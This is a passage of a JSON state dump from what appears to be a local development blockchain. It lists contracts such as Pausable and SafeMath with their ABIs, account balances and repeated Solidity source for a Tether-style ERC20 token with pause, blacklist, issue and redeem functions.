(deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0x0E696947A06550DEf604e82C26fd9E493e576337",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0E696947A06550DEf604e82C26fd9E493e576337": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // 